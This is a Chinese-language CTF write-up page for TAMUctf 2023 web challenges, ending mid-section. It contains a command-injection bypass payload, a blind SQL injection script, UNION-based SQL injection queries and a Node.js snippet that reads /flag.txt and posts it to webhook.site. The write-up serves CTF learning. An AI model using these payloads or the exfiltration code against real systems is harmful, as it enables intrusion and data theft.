@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>TAMUctf 2023 &mdash; CTF 0.0 documentation</title>
+      <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../../../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../../../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script src="../../../_static/jquery.js?v=5d32c60e"></script>
+        <script src="../../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+        <script data-url_root="../../../" id="documentation_options" src="../../../_static/documentation_options.js?v=44496db0"></script>
+        <script src="../../../_static/doctools.js?v=888ff710"></script>
+        <script src="../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../../index.html" class="icon icon-home">
+            CTF
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../Lexington-Informatics-Tournament.html">Lexington Informatics Tournament CTF 2023</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../../index.html">CTF</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">TAMUctf 2023</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../../_sources/source/2023/TAMUctf 2023/README.md.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="tamuctf-2023">
+<h1><a class="reference external" href="https://tamuctf.com/">TAMUctf 2023</a><a class="headerlink" href="#tamuctf-2023" title="Permalink to this heading"></a></h1>
+<section id="id1">
+<h2>前言<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h2>
+<p><a class="reference external" href="https://discord.com/channels/1096793565478277256/1096801776226799686">官方 discord 地址</a></p>
+<ul class="simple">
+<li><p>https://tamuctf.com/challenges#Migraine-22</p></li>
+</ul>
+</section>
+<section id="web">
+<h2>WEB<a class="headerlink" href="#web" title="Permalink to this heading"></a></h2>
+<section id="connect">
+<h3>Connect<a class="headerlink" href="#connect" title="Permalink to this heading"></a></h3>
+<p>应该是一个命令注入的题目，但是有一个黑名单过滤，不可以含有以下字符：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">escape_shell_cmd</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">char</span> <span class="ow">in</span> <span class="s1">&#39;&amp;#;`|*?~&lt;&gt;^()[]</span><span class="si">{}</span><span class="s1">$</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">False</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">return</span> <span class="kc">True</span>
+</pre></div>
+</div>
+<p>执行的命令如下，注意到返回结果中必须含有 HTTP：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="n">command</span> <span class="o">=</span> <span class="s2">&quot;curl -s -D - -o /dev/null &quot;</span> <span class="o">+</span> <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot; | grep -oP &#39;^HTTP.+[0-9]</span><span class="si">{3}</span><span class="s2">&#39;&quot;</span>
+        <span class="n">output</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="n">command</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>看上去似乎不能命令注入了？然而过滤的代码存在<strong>逻辑漏洞</strong>。</p>
+<ul class="simple">
+<li><p><strong>如果我们的第一个字符未在黑名单中，那么就直接返回 True 了。</strong></p></li>
+</ul>
+<p>所以可以利用如下 payload 简单绕过黑名单：</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span>HTTP<span class="p">;</span>cat<span class="w"> </span>flag.txt<span class="p">;</span>a
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>注意开头的<strong>空格</strong>，这是为了绕过黑名单。</p></li>
+</ul>
+</section>
+<section id="logical">
+<h3>Logical<a class="headerlink" href="#logical" title="Permalink to this heading"></a></h3>
+<p>页面显示要求我们输入一个用户名，如果用户名不存在于数据库中，那么会给邮箱发送一个重置密码的链接。</p>
+<p>关键的问题在于这个邮箱是什么？我们可以拿到邮箱的访问权吗？不过从题目来看应该是不可以，所以转换一下思路。</p>
+<ul class="simple">
+<li><p>抓包发现输入一个存在的用户名会响应 exists，反之则是 not exists</p></li>
+</ul>
+<p>灵感一现忽然觉得可能是 SQL 注入，因为后端必然是拿我们输入的用户名带入 SQL 语句中进行了查询，这样才能判断输入的用户名是否存在于数据库中。</p>
+<p><strong>输入单引号报错</strong></p>
+<p><img alt="image-20230501190742550" src="../../../_images/image-20230501190742550.png" /></p>
+<p>增加注释符回显正常</p>
+<p><img alt="image-20230501190808334" src="../../../_images/image-20230501190808334.png" /></p>
+<p>确定存在 SQL 注入，应该是盲注，经过我的尝试，应该可以根据存在或者不存在进行<strong>布尔盲注</strong>。</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">string</span>
+
+<span class="n">target</span> <span class="o">=</span> <span class="s1">&#39;http://logical.tamuctf.com/api/chpass&#39;</span>
+
+<span class="n">alphabet</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="o">.</span><span class="n">digits</span> <span class="o">+</span> <span class="s1">&#39;{$}#!?&lt;&gt;=*+.(),@^-_&#39;</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="s1">&#39;gigem{&#39;</span><span class="p">)</span>
+
+<span class="k">while</span> <span class="n">flag</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;}&#39;</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">alphabet</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s1">&#39;username&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;admin</span><span class="se">\&#39;</span><span class="s1"> and PASSWORD LIKE BINARY &quot;</span><span class="si">{</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="si">}{</span><span class="n">char</span><span class="si">}</span><span class="s1">%&quot;-- &#39;</span><span class="p">})</span> <span class="c1"># admin&#39; and PASSWORD LIKE BINARY &quot;gigem{a%&quot;-- </span>
+        <span class="k">if</span> <span class="s1">&#39;not exists&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">flag</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">char</span><span class="p">)</span>
+            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
+            <span class="k">break</span>
+</pre></div>
+</div>
+</section>
+<section id="blackbox">
+<h3>Blackbox<a class="headerlink" href="#blackbox" title="Permalink to this heading"></a></h3>
+<p>文件包含读取到 index.php 源码：</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$resource</span> <span class="o">=</span> <span class="s1">&#39;home&#39;</span><span class="p">;</span>
+
+<span class="k">require</span> <span class="s1">&#39;./config.php&#39;</span><span class="p">;</span>
+<span class="k">require</span> <span class="s1">&#39;./util.php&#39;</span><span class="p">;</span>
+
+<span class="nb">set_include_path</span><span class="p">(</span><span class="nx">INCLUDE_DIR</span><span class="p">);</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nv">$resource</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">];</span>
+  <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;.php&#39;</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+  <span class="k">include</span><span class="p">(</span><span class="s1">&#39;home.php&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>home.php：</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nx">INCLUDE_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nx">INCLUDE_DIR</span> <span class="o">.</span> <span class="s1">&#39;footer.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>config.php：</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">const</span> <span class="no">APP_NAME</span> <span class="o">=</span> <span class="s1">&#39;Blackbox&#39;</span><span class="p">;</span>
+<span class="k">const</span> <span class="no">INCLUDE_DIR</span> <span class="o">=</span> <span class="s1">&#39;./templates/&#39;</span><span class="p">;</span>
+<span class="k">const</span> <span class="no">DB_FILE</span> <span class="o">=</span> <span class="s1">&#39;../sqlite/site-data.db&#39;</span><span class="p">;</span>
+<span class="k">const</span> <span class="no">SECRET_KEY</span> <span class="o">=</span> <span class="s1">&#39;JYOFGX6w5ylmYXyHuMM2Rm7neHXLrBd2V0f5No3NlP8&#39;</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>util.php：</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">function</span> <span class="nf">db_login</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$username</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span><span class="p">(</span><span class="nx">DB_FILE</span><span class="p">);</span>
+  <span class="nv">$statement</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">&#39;SELECT key FROM users WHERE username=:uname AND password=:passwd;&#39;</span><span class="p">);</span>
+
+  <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">&#39;:uname&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
+  <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">&#39;:passwd&#39;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">try_auth</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$username</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$hash_password</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">db_login</span><span class="p">(</span><span class="nv">$username</span><span class="p">,</span> <span class="nv">$hash_password</span><span class="p">)</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">generate_guest_token</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;guest&#39;</span><span class="p">,</span> <span class="s1">&#39;user_key&#39;</span><span class="o">=&gt;</span><span class="nb">bin2hex</span><span class="p">(</span><span class="nb">random_bytes</span><span class="p">(</span><span class="mi">8</span><span class="p">)),</span> <span class="s1">&#39;admin&#39;</span><span class="o">=&gt;</span><span class="k">false</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">generate_token</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">generate_admin_token</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$username</span><span class="p">,</span> <span class="nx">string</span> <span class="nv">$user_key</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="o">=&gt;</span><span class="nv">$username</span><span class="p">,</span> <span class="s1">&#39;user_key&#39;</span><span class="o">=&gt;</span><span class="nv">$user_key</span><span class="p">,</span> <span class="s1">&#39;admin&#39;</span><span class="o">=&gt;</span><span class="k">true</span><span class="p">);</span>
+  <span class="k">return</span> <span class="nx">generate_token</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">generate_token</span><span class="p">(</span><span class="k">array</span> <span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nv">$b64json</span> <span class="o">=</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">));</span>
+  <span class="nv">$hmac</span> <span class="o">=</span> <span class="nb">hash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">,</span> <span class="nx">SECRET_KEY</span> <span class="o">.</span> <span class="nv">$b64json</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="nv">$b64json</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$hmac</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">verify_token</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$token</span><span class="p">)</span> <span class="p">{</span> 
+  <span class="nv">$token_data</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">hash</span><span class="p">(</span><span class="s1">&#39;md5&#39;</span><span class="p">,</span> <span class="nx">SECRET_KEY</span> <span class="o">.</span> <span class="nv">$token_data</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$token_data</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">is_admin</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$token</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">if</span><span class="p">(</span><span class="nx">verify_token</span><span class="p">(</span><span class="nv">$token</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SQLite3</span><span class="p">(</span><span class="nx">DB_FILE</span><span class="p">);</span>
+
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$token</span><span class="p">)[</span><span class="mi">0</span><span class="p">]),</span> <span class="k">TRUE</span><span class="p">);</span>
+    <span class="nv">$username</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+    <span class="nv">$user_key</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;user_key&#39;</span><span class="p">];</span>
+    <span class="nv">$admin</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">];</span>
+
+    <span class="nv">$statement</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">&#39;SELECT * FROM users WHERE username=:uname AND key=:ukey;&#39;</span><span class="p">);</span>
+    <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">&#39;:uname&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">);</span>
+    <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="s1">&#39;:ukey&#39;</span><span class="p">,</span> <span class="nv">$user_key</span><span class="p">);</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$statement</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+
+    <span class="k">if</span><span class="p">(</span><span class="nv">$result</span> <span class="o">!=</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetchArray</span><span class="p">()</span> <span class="o">!=</span> <span class="k">false</span> <span class="o">&amp;&amp;</span> <span class="nv">$admin</span> <span class="o">==</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>别忘记了登录还包含了 login.php</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;auth_token&#39;</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;auth_token&#39;</span><span class="p">,</span> <span class="nx">generate_guest_token</span><span class="p">(),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span><span class="o">*</span><span class="mi">30</span><span class="p">),</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+<span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">is_admin</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;auth_token&#39;</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: ?page=admin&#39;</span><span class="p">);</span>
+  <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">try_auth</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]);</span> 
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span> <span class="o">!=</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;auth_token&#39;</span><span class="p">,</span> <span class="nx">generate_admin_token</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">],</span> <span class="nb">end</span><span class="p">(</span><span class="nv">$result</span><span class="p">)),</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="p">(</span><span class="mi">86400</span><span class="o">*</span><span class="mi">30</span><span class="p">),</span> <span class="s1">&#39;/&#39;</span><span class="p">);</span>
+    <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: ?page=admin&#39;</span><span class="p">);</span>
+    <span class="k">die</span><span class="p">();</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nx">INCLUDE_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+<span class="x">&lt;main&gt;</span>
+<span class="x">  &lt;div class=&quot;login&quot;&gt;</span>
+<span class="x">    &lt;center&gt;</span>
+<span class="x">      &lt;form action=&quot;?page=login&quot;, method=&quot;post&quot;&gt;</span>
+<span class="x">        &lt;input class=&quot;username&quot; placeholder=&quot;Username&quot; name=&quot;username&quot; id=&quot;username&quot;&gt;&lt;/input&gt;&lt;br&gt;</span>
+<span class="x">        &lt;input type=&quot;password&quot; class=&quot;password&quot; placeholder=&quot;Password&quot; name=&quot;password&quot; id=&quot;password&quot;&gt;&lt;/input&gt;&lt;br&gt;</span>
+<span class="x">        &lt;button class=&quot;submit&quot;&gt;Login&lt;/button&gt;</span>
+<span class="x">      &lt;/form&gt;</span>
+<span class="x">    &lt;/center&gt;</span>
+<span class="x">  &lt;/div&gt;</span>
+<span class="x">&lt;/main&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nx">INCLUDE_DIR</span> <span class="o">.</span> <span class="s1">&#39;footer.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>admin.php:</p>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;auth_token&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nx">is_admin</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;auth_token&#39;</span><span class="p">]))</span> <span class="p">{</span>
+  <span class="nb">header</span><span class="p">(</span><span class="s1">&#39;Location: ?page=login&#39;</span><span class="p">);</span>
+  <span class="k">die</span><span class="p">();</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+
+<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nx">INCLUDE_DIR</span> <span class="o">.</span> <span class="s1">&#39;header.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+<span class="x">&lt;center&gt;</span>
+<span class="x">  &lt;h1&gt;</span><span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="s1">&#39;/flag.txt&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="x">&lt;/h1&gt;</span>
+<span class="x">&lt;/center&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">include</span><span class="p">(</span><span class="nx">INCLUDE_DIR</span> <span class="o">.</span> <span class="s1">&#39;footer.php&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<p>从 admin.php 可以知道，只要可以以管理员的身份访问 /admin 就可以看到 flag了。</p>
+<blockquote>
+<div><p>审计一番源码感觉完全没有办法伪造管理员 token 啥的，后面看别人的做法是 RCE….</p>
+<p>https://ayusshh.medium.com/tamuctf-2023-blackbox-writeup-af85520442d5</p>
+<p>具体地址看<a class="reference external" href="https://github.com/synacktiv/php_filter_chain_generator/blob/main/php_filter_chain_generator.py">这里</a></p>
+<p>关于为什么这样可以 RCE 的原理暂时还没探究，实在太抽象啦。</p>
+</div></blockquote>
+</section>
+<section id="migraine">
+<h3>Migraine<a class="headerlink" href="#migraine" title="Permalink to this heading"></a></h3>
+<p>简单阅读一番源代码，发现是一个 JS 命令执行的题目，但是不可以有大小写字母和数字。有一个 tricks 就是 JS解释器可以直接运行 JSFUCK 风格的代码。</p>
+<p>JSFUCK 的含义可以参照维基百科：
+<img alt="image-20230503110205813" src="../../../_images/image-20230503110205813.png" /></p>
+<ul class="simple">
+<li><p><strong>以 JSFUCK 风格写出的代码不需要另外的编译器或解释器来执行，无论浏览器或 JS 引擎中的原生 JS 解释器皆可直接运行。</strong></p></li>
+</ul>
+<p>那我们编写一个 JS 普通的命令执行代码，然后将其转为 JSFuck 风格即可。</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>process.mainModule.require(&#39;https&#39;).request({hostname: &#39;webhook.site&#39;,path: &#39;/6a5ff223-ac5b-4fc7-b3a4-014a10e79095&#39;,method: &#39;POST&#39;,headers: {&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,&#39;Content-Length&#39;: process.mainModule.require(&#39;fs&#39;).readFileSync(&#39;/flag.txt&#39;).toString().length}}).write(process.mainModule.require(&#39;fs&#39;).readFileSync(&#39;/flag.txt&#39;).toString())
+//记得把服务器换成自己的地址，推荐使用 webhook.site。
+</pre></div>
+</div>
+<p><strong>转为 <a class="reference external" href="http://www.jsfuck.com/">JSFuck</a>：</strong></p>
+<p><img alt="image-20230503110516202" src="../../../_images/image-20230503110516202.png" /></p>
+<p><img alt="image-20230503110501862" src="../../../_images/image-20230503110501862.png" /></p>
+</section>
+<section id="lost-and-forgotten">
+<h3>Lost and Forgotten<a class="headerlink" href="#lost-and-forgotten" title="Permalink to this heading"></a></h3>
+<p>给了一个博客，访问这些博客需要密码。</p>
+<p>一番测试之后发现搜索功能处存在 SQL 注入漏洞：</p>
+<p><img alt="image-20230504202951406" src="../../../_images/image-20230504202951406.png" /></p>
+<p><img alt="image-20230504203000700" src="../../../_images/image-20230504203000700.png" /></p>
+<p>接下来我们要做的事情是：</p>
+<ol class="arabic simple">
+<li><p>判断列数</p></li>
+<li><p>通过 information_schema 数据库查表名、列名</p></li>
+<li><p>查询 flag 数据</p></li>
+</ol>
+<p><strong>查列数</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">a</span><span class="s1">&#39; UNION SELECT 1,1,1,1,1,&#39;</span><span class="mi">1</span><span class="s1">&#39;;#</span>
+</pre></div>
+</div>
+<p><strong>查表名：</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">a</span><span class="s1">&#39; UNION SELECT table_name,1,1,1,1,&#39;</span><span class="mi">1</span><span class="s1">&#39; FROM INFORMATION_SCHEMA.TABLES;#</span>
+</pre></div>
+</div>
+<p><strong>查列名：</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">a</span><span class="s1">&#39; UNION SELECT column_name,1,1,1,1,&#39;</span><span class="mi">1</span><span class="s1">&#39; FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = &#39;</span><span class="n">articles</span><span class="s1">&#39;;#</span>
+</pre></div>
+</div>
+<p>发现 title 和 access_code 两列</p>
+<p><strong>查数据：</strong></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">a</span><span class="s1">&#39; UNION SELECT title,access_code,1,1,1,&#39;</span><span class="mi">1</span><span class="s1">&#39; FROM articles;#</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/deyixtan/ctf/tree/main/challenges/tamu-ctf-2023/web-lost-and-forgotten">参考</a></p></li>
+</ul>
+</section>
+<section id="web-lto">
